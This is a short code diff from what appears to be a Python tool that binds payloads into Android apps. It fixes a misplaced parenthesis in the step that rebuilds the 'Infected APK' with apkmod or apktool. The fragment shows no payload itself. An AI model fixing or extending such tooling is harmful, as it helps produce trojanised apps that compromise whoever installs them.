@@ -293,7 +293,7 @@ def Bind():
 		print (CYAN + '[+] Compiling Infected APK...\n' + WHITE)
 
 		if Termux_Bool:
-			subprocess.call("apkmod -r %s fin_out.apk" % (original.replace('.apk',''),shell=True))
+			subprocess.call("apkmod -r %s fin_out.apk" % (original.replace('.apk','')),shell=True)
 			os.chdir('../')
 		else:
 			subprocess.call("apktool b %s -o %s -f" % (original.replace('.apk',''),str(sys.argv[3])),shell=True)
